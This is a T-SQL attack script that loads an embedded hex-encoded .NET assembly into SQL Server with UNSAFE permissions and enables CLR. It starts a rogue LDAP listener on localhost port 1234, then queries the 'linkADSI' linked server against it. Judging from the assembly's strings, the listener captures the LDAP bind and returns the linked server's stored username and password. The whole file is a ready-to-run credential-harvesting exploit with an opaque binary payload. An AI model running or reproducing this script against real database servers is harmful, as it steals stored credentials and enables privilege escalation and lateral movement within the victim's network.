use MSDB;

DROP FUNCTION IF EXISTS ldap_listen;
DROP ASSEMBLY IF EXISTS ldapServer;

CREATE ASSEMBLY ldapServer AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010300c1fb5c640000000000000000e00002210b010b00002a000000060000000000001e49000000200000006000000000001000200000000200000400000000000000040000000000000000a000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000d04800004b00000000600000b002000000000000000000000000000000000000008000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e746578740000002429000000200000002a000000020000000000000000000000000000200000602e72737263000000b00200000060000000040000002c0000000000000000000000000000400000402e72656c6f6300000c000000008000000002000000300000000000000000000000000000400000420000000000000000000000000000000000490000000000004800000002000500a02d0000301b00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133001002000000001000011026f190000060b1201280500000a2d091201280600000a2b0116000a2b00062a133001002000000001000011026f190000060b1201280500000a2d091201280600000a2b0116000a2b00062a1b30030002010000020000110072010000700a007e0700000a02730800000a0b076f0900000a00076f0a00000a0c086f0b00000a0d7203000070130572030000701306091204282b0000062611047b410000047e010000042d1314fe0602000006730c00000a80010000042b007e01000004280100002b16fe01130a110a2d570011047b410000047e020000042d1314fe0603000006730c00000a80020000042b007e02000004280200002b130711077b41000004176f0f00000a6f0300002b130511077b41000004186f0f00000a6f0300002b130600086f1000000a00076f1100000a00721700007011051106281200000a0a00de0e13080011086f1300000a0a00de00000613092b0011092a00000110000000000700e4eb000e13000001133005005d00000003000011000316fe01130411042d140002722700007072010000706f1400000a100000026f1500000a0a06185b8d140000010b160c2b1a000708185b0208186f1600000a1f10281700000a9c000818580c0806fe04130411042ddc070d2b00092a00000013300300500000000400001100028e69185a731800000a0a00020d1613042b24091104910b0006722b000070078c14000001281900000a6f1a00000a26001104175813041104098e69fe04130511052dcf066f1300000a0c2b00082a1b300200890000000500001100170a72010000700b00026f1b00000a13042b3d11046f1c00000a0c000708281d00000a8c18000001281e00000a0b061e5d16fe0116fe01130511052d0e00077227000070281f00000a0b000617580a0011046f2000000a130511052db6de1d110475190000011306110614fe01130511052d0811066f2100000a00dc00076f2200000a0d2b00092a00000001100000020012004e60001d00000000133005007e0000000600001100021f7ffe02130511052d1500178d14000001130611061602d29c110613042b5a0002282300000a0a068e69d20b2b1800071759d20b060717599116fe01130511052d03002b0e000716fe0416fe01130511052ddb072080000000580c1707588d140000010d091608d29c0616091707282400000a000913042b0011042a0000133005005d0000000700001100041754160a0203911d6317fe0116fe01130411042d37000203911f7f5f0b1a8d140000010c02031758081607282400000a0008280400002b280500002b16282700000a0a04254a075854002b09000203911f7f5f0a00060d2b00092a000000133004006d0000000800001100031754160a178d140000010b020716176f2800000a260716911d6317fe0116fe01130511052d34000716911f7f5f0c088d140000010d020916086f2800000a2609280400002b280500002b16282700000a0a03254a085854002b09000716911f7f5f0a000613042b0011042a000000133002001200000009000011000203280600002b282a00000a0a2b00062a0000133001000b0000000a000011027b3e0000040a2b00062a2202037d3e0000042a13300300220000000b00001100178d140000010b071602280b0000069c07732b00000a1b282c00000a0a2b00062a0000133002000e0000000c0000110002280b0000061c630a2b00062a0000133002000f0000000d0000110002280b0000061f1f5f0a2b00062a00133002000f0000000e0000110002280b0000061f1f5f0a2b00062a0013300200100000000a0000110002280b0000061f1f5fd20a2b00062a8202282d00000a00000203d204282e00000a1b62581f4058d2280c00000600002a7602282d00000a00000203d204282e00000a1b6258d2280c00000600002a8a02282d00000a0000020304282e00000a1b6258208000000058d2280c00000600002a0000133001000c0000000f000011000273160000060a2b00062a4a02282d00000a00000203280c00000600002a0013300100110000000c00001100027b3f0000046f0e0000060a2b00062a00000013300100110000001000001100027b3f0000046f0d0000060a2b00062a00000013300200380000001100001100027b3f0000046f0e00000617fe0116fe010b072d1400027b3f0000046f10000006732f00000a0a2b0c1202fe150100001b080a2b00062a13300200380000001200001100027b3f0000046f0e00000616fe0116fe010b072d1400027b3f0000046f0f000006733000000a0a2b0c1202fe150400001b080a2b00062a13300200380000001300001100027b3f0000046f0e00000618fe0116fe010b072d1400027b3f0000046f11000006733100000a0a2b0c1202fe150500001b080a2b00062aba02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473120000067d3f000004002aee02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473120000067d3f00000402020528260000067d40000004002aba02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473130000067d3f000004002aee02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473130000067d3f00000402020528260000067d40000004002aba02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473140000067d3f000004002aee02168d140000017d4000000402733200000a7d4100000402282d00000a000002030473140000067d3f00000402020528260000067d40000004002aa202168d140000017d4000000402733200000a7d4100000402282d00000a000002037d3f000004002a1e02282d00000a2a4e027b42000004036f230000066f3300000a002a000013300500cd00000014000011140c732d0000060d0009733400000a7d42000004027b3f0000046f0d00000616fe01130511052d2300027b41000004082d0f09fe062e000006733500000a0c2b00086f3600000a00002b1400097b42000004027b400000046f3300000a0000097b420000046f3700000a28070000060a17068e6958097b420000046f3700000a588d140000010b0716027b3f0000046f0b0000069c06160717068e69282400000a00097b420000046f3800000a160717068e6958097b420000046f3700000a282400000a000713042b0011042a00000013300200200000001500001100022825000006d00800001b283900000a283a00000aa50800001b0a2b00062a13300500d90000001600001100027b3f0000046f0e00000616fe0116fe010c083aa100000000027b3f0000046f0f00000617fe0116fe010c082d1800027b4000000416283b00000a8c200000010b3890000000027b3f0000046f0f00000618fe0116fe010c082d41001a8d140000010a027b4000000416061a027b400000048e6959027b400000048e69282400000a0006280400002b280500002b16282700000a8c180000010b2b3a00283c00000a027b4000000416027b400000048e696f3d00000a0b2b1d00283c00000a027b4000000416027b400000048e696f3d00000a0b2b00072a00000013300300060100001700001100036f3e00000ad012000001283900000a283f00000a16fe010b072d1700283c00000a0374120000016f4000000a0a38d0000000036f3e00000ad018000001283900000a283f00000a16fe010b072d1c0003a518000001282300000a280400002b280500002b0a3898000000036f3e00000ad020000001283900000a283f00000a16fe010b072d0f0003a520000001284100000a0a2b6d036f3e00000ad014000001283900000a283f00000a16fe010b072d1500178d140000010c081603a5140000019c080a2b3c036f3e00000ad00900001b283900000a283f00000a16fe010b072d0a0003740900001b0a2b167239000070036f3e00000a281900000a734200000a7a062a000013300200170000001800001100027b41000004166f0f00000a6f0700002b0a2b00062a9a021f1017281e0000060000027b410000041816038c18000001731f0000066f4300000a00002a2e020328220000060000002a00001330040032000000190000110002169128150000060a160b0217120128080000060c02160807581758282c000006166f0f00000a74090000020d2b00092a00001b300400810000001a0000110000178d140000010a020616176f2800000a0b0716fe01130711072d4f0006169128150000060c160d0212032809000006130411048d1400000113050211051611046f2800000a26030873290000065103507b410000041105161104282c0000066f4400000a00171306de1100de05260000de00000314511613062b000011062a00000001100000000001006e6f00051300000113300500a60000001b00001100733200000a0a38850000000002039128150000060b0317581001160c0203120228080000060d03085810010773290000061304076f0d0000062c090916fe0216fe012b011700130611062d150011040203030958282c0000067d41000004002b20001104098d140000017d40000004020311047b400000041609282400000a00000611046f4300000a000309581001000304fe04130611063a6effffff0613052b0011052a000042534a4201000100000000000c00000076342e302e33303331390000000005006c000000940b0000237e0000000c0000f809000023537472696e677300000000f815000068000000235553006016000010000000234755494400000070160000c004000023426c6f620000000000000002000001571da209090e000000fa25330016000001000000220000000a000000420000002e0000003200000044000000390000000a0000001b000000030000000c0000000d00000009000000010000000300000001000000010000000700000000000a0001000000000006008a0083000600910083000600a0038d030600de03d4030600cb04b0040600e20483000600a10582050600500630060600700630060600a80683000600d60630060a004f0744070a00750762070a00870762070a00a10762070e00d107c5070600dc07b004060012088300060029088300060046088300060055088300060070086408060085088d030600b30883000600c90883000600e20883000600ef0883000600f608830006004f09830006006a09830006006f0983000600d80083000600a80964080600d809830000000000010000000000010001008101100019002100050001000100010100002e00210009000300040001010000370021000900080004000101000049002100090028000400810110005700210005003e000400010010005d00210005003e000b00010010006100210005003f001700010010006f002100200042002700030110001f090000050042002d001100af06e5011100fe06e50106069d000f005680a50012005680af0012005680bb0012005680c300120006069d000f005680cb002a005680d8002a005680e0002a005680e8002a005680f2002a005680fe002a00568003012a00568014012a00568025012a0056802e012a00568033012a0056803e012a0056804a012a00568055012a0056805e012a00568067012a00568071012a0056807a012a0056807e012a0056808c012a0056809c012a005680a6012a005680b5012a005680bf012a005680c7012a005680d7012a005680e5012a005680f3012a00568001022a00568011022a00568021022a0006069d000f0056802b02b50056803702b50056804402b50056805202b50056806002b50056807202b50056808302b50056809902b5005680a702b5005680b602b5005680c102b5005680cd02b5005680d802b5005680e402b5005680f402b50056800503b50056801403b50056802403b50056803303b50056804303b50056805403b50001005b041f010100a50439010400aa043d010600d204410106003209c003a82000000000960096000a00010050200000000091009906df0102007c20000000009100f106df010300c8210000000096006903b900040034220000000096007b03c00006009022000000009600a903c60007003823000000009600b603cc000800c423000000009600c503d20009003024000000009600c503db000c00ac24000000009600e503e3000e00cc24000000008608ec03e9001000e324000000008308f803ed001000ec240000000086080404f20011001c250000000086081604f600110038250000000086082004fb00110054250000000086082d040001110070250000000086083f04e90011008c250000000086184f0405011100ad250000000086184f040c011300cb250000000086184f0413011500f02500000000960055041901170008260000000081184f04ed0018001c260000000086081604f60019003c260000000086080404f20019005c260000000086082d0449011900a026000000008608200452011900e4260000000086083f045b01190028270000000086184f040501190057270000000086184f0463011b0093270000000086184f040c011e00c2270000000086184f046b012000fe270000000086184f04130123002d280000000086184f047301250069280000000084184f047a012800b028000000008600ed04800129008c29000000008600f60485012900b829000000008600f6048b012900a02a000000008100ed048f012900b42b0000000086080105af012a00d72b0000000086184f04b3012a00fe2b0000000081184f047a012b000c2c0000000096000f05b8012c004c2c0000000096001b05bf012d00ec2c0000000091002a05c8012f0092280000000086184f04db0132009a280000000086003709c703320000000100440500000100a60600000100a606000001004905101002004d05000001005c05000001006205000001006705000001005c05000002006e0502000300750500000100ae0502000200750500000100b50500000200bb0500000100bd0500000100c30500000200cd0500000100d80500000200cd0500000100e10500000200cd0500000100e90500000100e90500000100c30500000200f10500000100c30500000200f10500000300bd0500000100d80500000200f10500000100d80500000200f10500000300bd0500000100ff0500000200f10500000100ff0500000200f10500000300bd05000001000b0600000100bd05000001000f06000001000b06000001005c0500000100ae05020002001906000001005c0500000200200600000300670500000100a60639004f04db0141004f04b30149004f04db0159004f04db010c002507f5010c003707f20061005907040269004f04080269008107db01690091070f027100af07140214004f0421028100ea0727028100ee073e021c00fe07580271000708db0169000d08db0191001908620209002008690291003308810291003b08af0191004b088702a9005d088d02b1004f04b301910019089d02b1007e08a30219009108b402b9009f088b01a900ab08b9029100b908be029100b908c402b900c008f200c900d508db019100dd086902d100ed04cc00d900fc08d60281000609ef0281000e090303d100ab0810032100160920038100e50333039100b908400319004f04510319001b09570309004f04db01a9005d0871030c004f047f0324004f047f032c004f047f031c004f04db0134004609d30334004f04db013c004f0421021c005809e40334006009af0134000e09ee03f10081090904a90093091004d1009e091c040901b10923040901ba0929040900c4093804f100cc093d040901ed044504d100ed044b0411014f0454041c00f2097f031c004609d303080010001600080014001b0002001500d90108001800200008001c002500080024001600080028001b0008002c002000080030002500080034002e0008003800330008003c003800080040003d0008004400420008004800470008004c004c00080050005100080054005600080058005b0008005c006000080060006500080064006a00080068006f0008006c007400080070007900080074007e0008007800830008007c008800080080008d0008008400920008008800970008008c009c0008009000a10008009400a60008009800ab0008009c00b0000800a40016000800a8001b000800ac0020000800b00025000800b4002e000800b80033000800bc0079000800c00038000800c4003d000800c80042000800cc0047000800d0004c000800d40051000800d80056000800dc005b000800e00060000800e40065000800e8006a000800ec008d000800f00092000800f4009700210023001b002e00130096042e001b009f04400023001b00410023001b00600023001b00430123001b00600123001b00800123001b00c10723001b00fa016d029302a902ca02e1021703280349034d035c03620367036c0376037b0385039c03b203f4031704310459046504690472048004070001000800070009000c0000007404220100007c04260100008a042a01000090042f0100004900340100009904220100008a042a0100007c042601000049009501000090049e0100009904a70100003a05d50102000b00030001000c00030002000d00050002000e00070002000f000900020010000b00020011000d00020017000f0002001800110002001900130002001a00150002001b001700020027001900ee01190251029503ac03cd03dd03060451040480000000000000000000000000000000008e06000004000000000000000000000001007a000000000004000000000000000000000001008300000000000400000000000000000000000100b907000000000a000800000000004900ff041b0039021d00390248005e024b00ff024d00ff0253005e024800610400000000003c4d6f64756c653e006c6461705365727665722e646c6c004c646170537276006c646170417373656d626c7900546167436c61737300556e6976657273616c4461746154797065004c6461704f7065726174696f6e005574696c7300546167004c646170417474726962757465004c6461705061636b6574006d73636f726c69620053797374656d004f626a65637400456e756d006c697374656e0076616c75655f5f00556e6976657273616c004170706c69636174696f6e00436f6e74657874005072697661746500456e644f66436f6e74656e7400426f6f6c65616e00496e746567657200426974537472696e67004f63746574537472696e67004e756c6c004f626a6563744964656e746966696572004f626a65637444657363726970746f720045787465726e616c005265616c00456e756d65726174656400456d6265646465645044560055544638537472696e670052656c6174697665005265736572766564005265736572766564320053657175656e636500536574004e756d65726963537472696e67005072696e7461626c65537472696e6700543631537472696e6700566964656f746578537472696e6700494135537472696e670055544354696d650047656e6572616c697a656454696d650047726170686963537472696e670056697369626c65537472696e670047656e6572616c537472696e6700556e6976657273616c537472696e6700436861726163746572537472696e6700424d50537472696e670042696e64526571756573740042696e64526573706f6e736500556e62696e6452657175657374005365617263685265717565737400536561726368526573756c74456e74727900536561726368526573756c74446f6e6500536561726368526573756c745265666572656e6365004d6f6469667952657175657374004d6f64696679526573706f6e7365004164645265717565737400416464526573706f6e73650044656c526571756573740044656c526573706f6e7365004d6f64696679444e52657175657374004d6f64696679444e526573706f6e736500436f6d706172655265717565737400436f6d70617265526573706f6e7365004162616e646f6e5265717565737400457874656e6465645265717565737400457874656e646564526573706f6e736500496e7465726d656469617465526573706f6e736500537472696e67546f42797465417272617900427974654172726179546f537472696e670053797374656d2e436f6c6c656374696f6e730042697441727261790042697473546f537472696e6700496e74546f4265724c656e677468004265724c656e677468546f496e740053797374656d2e494f0053747265616d00526570656174006765745f54616742797465007365745f54616742797465006765745f4973436f6e7374727563746564006765745f436c617373006765745f4461746154797065006765745f4c6461704f7065726174696f6e006765745f436f6e7465787454797065002e63746f72005061727365003c546167427974653e6b5f5f4261636b696e674669656c640054616742797465004973436f6e737472756374656400436c61737300446174615479706500436f6e7465787454797065005f7461670056616c75650053797374656d2e436f6c6c656374696f6e732e47656e65726963004c6973746031004368696c6441747472696275746573004e756c6c61626c6560310047657442797465730047657456616c75650054006765745f4d65737361676549640050617273655061636b65740054727950617273655061636b657400506172736541747472696275746573004d657373616765496400706f727400686578007472696d576869746573706163650062797465730062697473006c656e677468006f66667365740062657242797465436f756e740053797374656d2e52756e74696d652e496e7465726f705365727669636573004f75744174747269627574650073747265616d007374756666006e0076616c7565006f7065726174696f6e00697353657175656e636500646174615479706500636f6e746578740074616742797465006973436f6e737472756374656400636f6e746578745479706500746167006d6573736167654964007061636b65740063757272656e74506f736974696f6e0053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300436f6d70696c6174696f6e52656c61786174696f6e734174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465006c646170536572766572003c6c697374656e3e625f5f30006f0046756e636032004353243c3e395f5f436163686564416e6f6e796d6f75734d6574686f6444656c65676174653200436f6d70696c657247656e657261746564417474726962757465003c6c697374656e3e625f5f31004353243c3e395f5f436163686564416e6f6e796d6f75734d6574686f6444656c6567617465330047657456616c75654f7244656661756c74006765745f48617356616c75650053797374656d2e4e657400495041646472657373004c6f6f706261636b0053797374656d2e4e65742e536f636b657473005463704c697374656e657200537461727400546370436c69656e7400416363657074546370436c69656e74004e6574776f726b53747265616d0047657453747265616d0053797374656d2e436f72650053797374656d2e4c696e7100456e756d657261626c650049456e756d657261626c65603100416e790053696e676c654f7244656661756c74006765745f4974656d00436c6f73650053746f7000537472696e6700466f726d617400546f537472696e6700457863657074696f6e005265706c616365006765745f4c656e677468004279746500537562737472696e6700436f6e7665727400546f427974650053797374656d2e5465787400537472696e674275696c64657200417070656e640049456e756d657261746f7200476574456e756d657261746f72006765745f43757272656e7400546f496e74333200496e74333200436f6e636174004d6f76654e6578740049446973706f7361626c6500446973706f7365005472696d00426974436f6e7665727465720042756666657200417272617900426c6f636b436f7079005265766572736500546f4172726179005265616400476574003c3e635f5f446973706c6179436c61737332006c697374003c47657442797465733e625f5f300041646452616e676500416374696f6e603100466f7245616368006765745f436f756e7400547970650052756e74696d655479706548616e646c65004765745479706546726f6d48616e646c65004368616e67655479706500546f426f6f6c65616e00456e636f64696e67006765745f5554463800476574537472696e670047657454797065006f705f457175616c69747900496e76616c69644f7065726174696f6e457863657074696f6e00416464000000000100133c0075006e006b006e006f0077006e003e00000f7b0030007d003a007b0031007d0000032000000d7b0030003a00780032007d00002b4e006f007400680069006e006700200066006f0075006e006400200066006f00720020007b0030007d00000000003e0ab379d8808a4482f3bd20cebb9b260008b77a5c561934e0890400010e080206080306110c040000000004010000000402000000040300000003061110040400000004050000000406000000040700000004080000000409000000040a000000040b000000040c000000040d000000040e000000040f0000000410000000041100000004120000000413000000041400000004150000000416000000041700000004180000000419000000041a000000041b000000041c000000041d000000041e000000030611140600021d050e020500010e1d050500010e120d0500011d0508080003081d0508100807000208121110080500020e0e0803200005042001010503200002042000110c042000111004200011140620020111140206200201111002052002010502050001121c050206050328000503280002042800110c042800111004280011140306121c03061d0507061512150112200820001511190111140820001511190111100720001511190105072003011114021c072003011110021c0620030105021c05200101121c0420001d05053001001e000320001c0520011d051c082800151119011114082800151119011110072800151119010503200008042001010806000112241d050800020212111012240c00031512150112201d050808032800080101032000010500010212200806151229021220020615111901111404200013000907020215111901111403061231062002011231080420001239042000123d0715122902122002052002011c181110010202151245011e00151229021e0002040a011220121001021e00151245011e00151229021e000206151215011220052001130008030a010e0600030e0e1c1c0320000e13070b0e12351239123d12240e0e1220124d0e020520020e0e0e0520020e0808050002050e08090705081d05081d05020500020e0e1c05200112590e0a07061259050e1d050802042000125d040001081c0500020e1c1c0500020e0e0e0b0707080e1c0e125d0212650a000501127108127108080d07071d0505081d051d05021d050f100101151245011e00151245011e00030a01050c1001011d1e00151245011e00060002081d050808070508081d050802072003081d0508080a0706081d05081d0508020c100102151245011e001e00080800010e151245010e0307010e03070105052001011d050420010208050702021d05040701110c040701111004070111140400010502040701121c030701020520010113000f070315111901111402151119011114061511190111100f0703151119011110021511190111100515111901050d07031511190105021511190105060615121501050520010112200515121501050920010115124501130006151275011220092001011512750113000520001d13001107061d051d0515127501122012281d0502021e000600011279117d0600021c1c12790407011e00060002021d05080500001280850720030e1d0508080607031d051c02042000127907000202127912790520011d050e0500011d0502021d05042001010e0707031d05021d05030a010803070108080704121c080812240d07081d0508121c08081d050202150707151215011220121c08081224151215011220020801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010000f848000000000000000000000e490000002000000000000000000000000000000000000000000000004900000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058600000540200000000000000000000540234000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000000000000000000000000000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004b4010000010053007400720069006e006700460069006c00650049006e0066006f0000009001000001003000300030003000300034006200300000002c0002000100460069006c0065004400650073006300720069007000740069006f006e000000000020000000300008000100460069006c006500560065007200730069006f006e000000000030002e0030002e0030002e003000000040000f00010049006e007400650072006e0061006c004e0061006d00650000006c006400610070005300650072007600650072002e0064006c006c00000000002800020001004c006500670061006c0043006f00700079007200690067006800740000002000000048000f0001004f0072006900670069006e0061006c00460069006c0065006e0061006d00650000006c006400610070005300650072007600650072002e0064006c006c0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000030002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000030002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000c000000203900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;

CREATE FUNCTION [dbo].ldap_listen(@port int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME ldapServer.[ldapAssembly.LdapSrv].listen;

EXEC sp_configure 'clr enabled', 1; RECONFIGURE; 

SELECT dbo.ldap_listen(1234);

SELECT * FROM OpenQuery( linkADSI, 'SELECT * FROM ''LDAP://localhost:1234'' ');
